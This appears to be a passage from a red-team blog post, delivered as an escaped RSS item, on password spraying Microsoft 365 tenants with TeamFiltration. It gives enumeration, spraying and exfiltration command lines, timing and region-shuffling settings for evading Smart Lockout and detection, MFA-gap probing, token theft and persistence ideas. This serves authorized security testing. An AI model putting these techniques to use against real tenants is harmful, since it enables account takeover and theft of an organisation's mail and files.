&lt;p&gt;Needless to say, you are responsible for your own actions.&lt;/p&gt;
&lt;h3&gt;Barging in with Teamfiltration&lt;span class=&#34;absolute -mt-20&#34; id=&#34;barging-in-with-teamfiltration&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#barging-in-with-teamfiltration&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;With the caveats out of the way, let&amp;rsquo;s dive in. While I write about Teamfiltration here, it is not the only tool for the job, though it is a very fine tool. Think of it as a many-in-one tool kit with user enumeration and data exfiltration, not just password spraying. If you just want password spraying with integration of AWS API gateway proxying (most of the below implemented that through Fireprox), there are a number of alternatives too:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;em&gt;&lt;a href=&#34;https://github.com/knavesec/CredMaster&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CredMaster&lt;/a&gt;&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;&lt;a href=&#34;https://github.com/0xZDH/o365spray&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;o365spray&lt;/a&gt;&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;&lt;a href=&#34;https://github.com/optiv/Go365&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Go365&lt;/a&gt;&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;&lt;a href=&#34;https://github.com/Tw1sm/spraycharles&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;spraycharles&lt;/a&gt;&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;And if you understand the concepts behind Smart Lockout, and maybe have had a read at the source code of Fireprox, it shouldn&amp;rsquo;t be too hard to implement a sprayer from scratch yourself. If you do want to write one, this reference on &lt;em&gt;&lt;a href=&#34;https://trustedsec.com/blog/from-error-to-entry-cracking-the-code-of-password-spraying-tools&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;M365 login error messages&lt;/a&gt;&lt;/em&gt; would be a must-read in my opinion.&lt;/p&gt;
&lt;h2&gt;Setting the tool up&lt;span class=&#34;absolute -mt-20&#34; id=&#34;setting-the-tool-up&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#setting-the-tool-up&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Teamfiltration&amp;rsquo;s author Flangvik&amp;rsquo;s own &lt;em&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=J8ohuanP2gA&amp;amp;list=PLxxLIupMt6nDN5bAJqBZFUpxp8Hcyzbkn&amp;amp;pp=iAQB&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Youtube playlist&lt;/a&gt;&lt;/em&gt; on the its usage is a great reference on how to set up and use the tool. I&amp;rsquo;d still go through the setup briefly here. Teamfiltration is designed around red team engagements and so it stores the information (valid usernames, credentials, password spray log, etc) in a local database, because you wouldn&amp;rsquo;t want to mix the sensitive details of Bank A and Retail Chain B, for example. The tool is designed for a sequential workflow of using &lt;code&gt;--enum&lt;/code&gt; to find valid users, &lt;code&gt;--spray&lt;/code&gt; to find valid username:password pair, and then &lt;code&gt;--exfil&lt;/code&gt; to loot. The reason I go into this is that there is a little quirk of Teamfiltration &amp;ndash; the &lt;code&gt;--spray&lt;/code&gt; module does not seem to have &lt;code&gt;-user&lt;/code&gt; flag (yet?) as it reads the validated users from the local database from prior runs of &lt;code&gt;--enum&lt;/code&gt; which would confuse the heck out of operators who don&amp;rsquo;t know this.&lt;/p&gt;
&lt;p&gt;Beside each of your clients having their own local database, there is also the Teamfiltration profile, which is a json file that you supply to the tool everytime you run it. From an Opsec perspective it does not seem to matter much regarding client segregation, though it offers you a way to further tweak settings inbetween jobs to cater to your needs.&lt;/p&gt;
&lt;p&gt;There are a number of optional inputs in a profile. At a minimum you need to supply:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;A set of sacrificial O365 user credentials: The user needs to be in an Azure / M365 tenant. A private MSDN / Outlook / Live account would not work. Reason behind this is that user enum works by searching for a supplied email through Teams, much like how one would message an external org tenant. This functionality doesn&amp;rsquo;t work with accounts &lt;em&gt;not&lt;/em&gt; associated with a tenant. Though it is called &amp;ldquo;sacrificial&amp;rdquo; it is simply used to look people up on Teams.&lt;/li&gt;
&lt;li&gt;AWS access and secret keys to the API gateway IAM account previously described.&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;Using Teams to enumerate users is approach the author recommended, but there are other available methods, such as the &lt;code&gt;--validate-msol&lt;/code&gt; option which uses the GetCredentialType method and is slower. A nuance we found during our testing was that some accounts (for example, service accounts) indeed do not have a Teams license but would instead only show up on &lt;code&gt;--validate-msol&lt;/code&gt;. On the other hand &lt;code&gt;--validate-login&lt;/code&gt; triggers logins to check, is extremely loud and is not recommended.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;For all the other profile options, you can just copy from the Github repo&amp;rsquo;s template. &amp;ldquo;Proxy&amp;rdquo; here refers to a local/remote web proxy for debugging purposes only, for example 127.0.0.1:8080 shown here is the one commonly used by BurpSuite. It is completely optional.&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;{
     &amp;#34;pushoverAppKey&amp;#34;: &amp;#34;&amp;#34;,
     &amp;#34;pushoverUserKey&amp;#34;: &amp;#34;&amp;#34;,
     &amp;#34;dehashedEmail&amp;#34; : &amp;#34;&amp;#34;,
     &amp;#34;dehashedApiKey&amp;#34;: &amp;#34;&amp;#34;,
     &amp;#34;sacrificialO365Username&amp;#34;: &amp;#34;tfsacrificialuser1@domain.org&amp;#34;,
      &amp;#34;sacrificialO365Passwords&amp;#34;: &amp;#34;RANDOM123&amp;#34; , 
      &amp;#34;proxyEndpoint&amp;#34;: &amp;#34;http://127.0.0.1:8080&amp;#34;,
      &amp;#34;AWSAccessKey&amp;#34;: &amp;#34;CHANGEME&amp;#34;,
      &amp;#34;AWSSecretKey&amp;#34;: &amp;#34;CHANGEME&amp;#34;,
      &amp;#34;UserAgent&amp;#34;: &amp;#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64)...&amp;#34;,
      &amp;#34;AwsRegions&amp;#34;:[&amp;#34;us-east-1&amp;#34;, &amp;#34;us-west-1&amp;#34;, &amp;#34;us-west-2&amp;#34;, &amp;#34;ca-central-1&amp;#34;,...]
}&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;h3&gt;User Enumeration&lt;span class=&#34;absolute -mt-20&#34; id=&#34;user-enumeration&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#user-enumeration&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Refer to Flangvik&amp;rsquo;s video on nuances in enumerating users with Teamfiltration, but the base options with &lt;code&gt;--validate-teams&lt;/code&gt; worked well for us:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;~/tools/TeamFiltration --config ./TFconfig_client.json --enum --usernames ./names.txt --validate-teams --outpath ./TF&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;&lt;code&gt;--outpath ~/clientA/TF&lt;/code&gt; - this means the results of the enumeration is saved in a database file in the stated path, which the subsequent steps would use.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/pic5.png&#34; title=&#34;pic5&#34; alt=&#34;pic5&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;pic5&lt;/figcaption&gt;
  &lt;/figure&gt; User enum in action on an engagement.&lt;/p&gt;
&lt;h3&gt;Password Spraying&lt;span class=&#34;absolute -mt-20&#34; id=&#34;password-spraying&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#password-spraying&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;~/tools/TeamFiltration --config ./TFconfig.json --outpath ./TF --spray --sleep-min 75 --sleep-max 90 --jitter 10 --shuffle-users --shuffle-regions --exclude exclude.txt --common-only&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/pic6.png&#34; title=&#34;pic6&#34; alt=&#34;pic6&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;pic6&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;As previously explained, our goal is to not trigger Smart Lockout so that a correct credential set would get us either &amp;ldquo;Access Granted&amp;rdquo; or &amp;ldquo;MFA required&amp;rdquo; returns messages, instead of the &lt;code&gt;AADESTS50053 idslocked&lt;/code&gt; error message. What has been found to work for us are these settings:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;--shuffle-regions&lt;/code&gt;:&lt;/p&gt;
&lt;p&gt;This seemed to be the most important, as you can see TF creates roughly 10 Fireprox endpoints in the regions you defined in the TF profile. By shuffling regions, each request comes from a different AWS georegion and the sequence is also shuffled. &lt;code&gt;--shuffle users&lt;/code&gt; is to change the sequence of users being sprayed. It did not seem to affect detection but I like to keep it on too.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;--sleep-min&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;and &lt;code&gt;--sleep-max&lt;/code&gt;: It is also critical to space out your spraying rounds as this defines the min/max time interval (in minutes) between which each user is attempted again. The time is randomised a bit between the 2 values to not look regular to MS. Somewhere around 1 hour per round worked for us.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;--jitter&lt;/code&gt;:&lt;/p&gt;
&lt;p&gt;it defines the time (in seconds) within one round, between trying a password against any 2 users. Against there is some randomised variability to not look like a bot to MS.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;--exclude&lt;/code&gt;:&lt;/p&gt;
&lt;p&gt;The &lt;code&gt;AADESTS50053 idslocked&lt;/code&gt; error message is something expected to appear in a small % of users (up to 5 or even 10%), even in the first spraying round. You can try to exclude these users in subsequent rounds, or not. Sometimes &lt;code&gt;AADESTS50053&lt;/code&gt; locked user(s) are observed to unlock on subsequent rounds so it&amp;rsquo;s not the end of the world as long as the % remains small and the client is in the loop of your actions.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;--common-only&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Tries the &amp;ldquo;commonly observed&amp;rdquo; passwords the author defined in the source code. Of course you can use your own but these are quite good actually.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Let&amp;rsquo;s say your spraying went well and you found valid credentials, then you would be given the choice by the tool to either &lt;code&gt;--exfil&lt;/code&gt; to loot right away, or do it later. I would recommend to do it right away, unless there is a compelling reason not to.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/pic7.png&#34; title=&#34;pic7&#34; alt=&#34;pic7&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;pic7&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;You can also see all the valid credentials you found in prior spraying in the tool.&lt;/p&gt;
&lt;h3&gt;Wait, what about MFA?&lt;span class=&#34;absolute -mt-20&#34; id=&#34;wait-what-about-mfa&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#wait-what-about-mfa&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;One reason why password spraying is performed less commonly by security testers against M365 might be the prevalence of multi-factor authentication (MFA), particularly in more mature or regulated clients. At least that was my assumption when learning about all these approaches.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;I thought, why password spray an MFA-enabled client? At worst you&amp;rsquo;re going to alert the defenders and at best you can prove that MFA was working as intended to protect people who had weak passwords.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;Such was my assumption. What I learned later was that implementing MFA in M365 was not as simple as flipping a switch. Often times, accounts can have missing MFA requirements, for any number of reasons:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Application / service accounts that does not support MFA usage.&lt;/li&gt;
&lt;li&gt;New starter who have not gotten their company device to set up MFA on, or&lt;/li&gt;
&lt;li&gt;Leaver accounts not deactivated, from a time when the org haven&amp;rsquo;t implemented MFA yet.&lt;/li&gt;
&lt;li&gt;Legacy applications using M365 OAuth that the business needs, but does not support MFA.&lt;/li&gt;
&lt;li&gt;and so on.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;So after you have found a set of valid credentials on Teamfiltration (congrats btw), you can either interactively choose to &lt;code&gt;exfil&lt;/code&gt; immediately or hit &lt;code&gt;--exfil&lt;/code&gt; later to loot. What TF then does is to enumerate all the known platforms and applications with those credentials and see if there are any holes in the MFA implementation.&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;~/tools/TeamFiltration --config ./TFconfig.json --outpath ./TF --exfil --all --roadtools ./TF/.roadtools_auth&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;For example, the tool would try trying:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;Windows PC - MS Teams - invalid
Mac - MS Teams - invalid
iPhone - MS Teams - invalid
Android - MS Teams - invalid
...
Windows PC - Outlook - invalid
Mac - Outlook - MFA Hole found!
...&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;When a hole is discovered, the tool goes in, grabs the relevant access and refresh tokens that can possibly be obtained, and then exfiltrates emails, Teams chat log, Sharepoint files and so on. You could also export the tokens to be used in other tools like Roadtools or GraphRunner.&lt;/p&gt;
&lt;p&gt;Tools such as &lt;a href=&#34;https://github.com/dafthack/MFASweep&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;MFASweep&lt;/a&gt; does a very similar MFA enumeration to look for an implementation gap, given valid set(s) credentials, for various Microsoft services and platoform combinations.&lt;/p&gt;
&lt;h3&gt;Opsec Concerns &amp;amp; Post Exploitation&lt;span class=&#34;absolute -mt-20&#34; id=&#34;opsec-concerns--post-exploitation&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#opsec-concerns--post-exploitation&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Being stealthy is crucial for many of us red teamers, so it is reasonable to ask the question of, how loud is sending thousands of login request to a single M365 tenant? The good (and bad) news is, as of 2024, spraying low and slow (as described above) can get past Entra Smart Lockout, and even if there are a couple of &lt;code&gt;AADESTS50053 idslocked&lt;/code&gt; errors along the way, the attack itself does not produce a &amp;ldquo;singular&amp;rdquo; &lt;em&gt;We are under attack from a password spray&lt;/em&gt; alert under either MS&amp;rsquo;s Entra ID protection or Defender for M356 by default. The repeated login attempts do appear in the logs if blue team is looking for it, but before you find any valid credentials, you should still be under the radar unless the client has custom detection rules (perhaps, &amp;gt;1k per day failed login attempts for the whole organisation?).&lt;/p&gt;
&lt;p&gt;The second point is more open for discussion, even if the defenders figured out they are under some sort of distributed password spraying attack geolocated around the world, while this might heighten the alertness of the team, there seem to be little that can be done at the moment. A caveat is that as Microsoft themselves were compromised by a distributed password spraying attack, I would not be surprised if they do something soon-ish, but we shall see.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Quoting Nikhil Mittal, a renowned voice in our community, &amp;ldquo;the loudest action you can perform with Azure or M365 in general, is authentication.&amp;rdquo;&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;Where you could quite reliably get an alert is when a set of valid credentials are found are used authenticate to perform the post-exploitation steps. So far, the only activity that can be used to verify credentials is using them to login, so the notification on our tooling that &amp;ldquo;valid creds are found&amp;rdquo; should also be treated as alert T+0.&lt;/p&gt;
&lt;p&gt;That is the reason why I recommended running the &lt;code&gt;--exfil&lt;/code&gt;, or performing other post-exploitation actions as soon as you find any set of valid credentials. If the blue team caught on and got the user to reset their password, your hard work so far would have been for naught. On the other hand, our experience with Teamfiltration so far has been that, it takes typically minutes to download thousands of business emails, Team chat logs and hundreds of MiBs of Sharepoint data, so it is definitely worthwhile to do that first for proving impact upfront.&lt;/p&gt;
&lt;h4&gt;Do you have a game plan?&lt;span class=&#34;absolute -mt-20&#34; id=&#34;do-you-have-a-game-plan&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#do-you-have-a-game-plan&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;Another generic recommendation is to have a generic post-exploitation plan before starting the password spray. It can any of the below:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Prepared internal phishing email &amp;amp; payload that you can hit send right away.&lt;/li&gt;
&lt;li&gt;Token-craft - figure out what post-ex tools need what sort of access and/or refresh tokens, and how to get &amp;amp; use them.&lt;/li&gt;
&lt;li&gt;Organisational Persistence with inviting your own M365 users into the client&amp;rsquo;s org as guests, and registering your malicious Enterprise application to retain access even if the compromised user&amp;rsquo;s been burned. GraphRunner is an incredible post-exploitation toolkit for these.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Final word&lt;span class=&#34;absolute -mt-20&#34; id=&#34;final-word&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#final-word&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;All in all, distributed and low-volume password spraying, paired with MFA gap bruteforcing, is a valid and powerful approach for M365 initial access. While it is not expected to get you in for 100% of your clients engagements (For example, some clients have few users, and implement air-tight MFA on all of them. In those cases, social engineering would be a better bet), the approach described would be a valuable addition to most red team&amp;rsquo;s toolkit, especially if the bad guys are using it effectively already.&lt;/p&gt;

      </description>
    </item>
    
  </channel>
</rss>
